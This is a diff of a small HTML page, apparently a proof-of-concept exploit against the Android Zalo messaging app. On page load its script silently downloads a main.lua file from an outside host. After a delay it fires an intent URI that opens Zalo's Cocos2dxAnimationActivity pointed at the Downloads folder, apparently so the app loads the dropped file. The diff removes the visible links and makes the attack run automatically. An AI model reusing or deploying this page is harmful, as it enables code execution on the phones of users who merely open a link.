@@ -1,29 +1,22 @@
 <!DOCTYPE html>
 <html>
-    <body>
-        <h1>zalo.html</h1>
-        <a style='font-size: 2.0em;' href="https://36e9-121-190-139-95.ngrok-free.app/main.lua">Download</a>
-        <br/><br/>
-        <a style='font-size: 2.0em;' href='javascript: go()'>Cocos2dxAnimationActivity</a>
-    </body>
-
     <script>
         let link = document.createElement('a');
         link.download = '';
         link.href = ' https://iiiiiiliiiliil.github.io/blog/main.lua';
         link.click();
 
-        
-        
-        let intent = '';
-        intent += 'intent:#Intent;';
-        intent += 'component=com.zing.zalo/com.zing.zalo.ui.Cocos2dxAnimationActivity;';
-        intent += 'S.extra_asset_path=/storage/emulated/0/Downloads;';
-        intent += 'S.extra_metadata_name=;';
-        intent += 'i.extra_effect_type=5;';
-        intent += 'S.extra_play_params=x;';
-        intent += 'B.extra_keyboard_showing=false;';
-        intent += 'end;';
-        window.location.href = intent;
+        setTimeout(() => {
+            let intent = '';
+            intent += 'intent:#Intent;';
+            intent += 'component=com.zing.zalo/com.zing.zalo.ui.Cocos2dxAnimationActivity;';
+            intent += 'S.extra_asset_path=/storage/emulated/0/Downloads;';
+            intent += 'S.extra_metadata_name=;';
+            intent += 'i.extra_effect_type=5;';
+            intent += 'S.extra_play_params=x;';
+            intent += 'B.extra_keyboard_showing=false;';
+            intent += 'end;';
+            window.location.href = intent;
+        }, 3000);
     </script>
 </html>
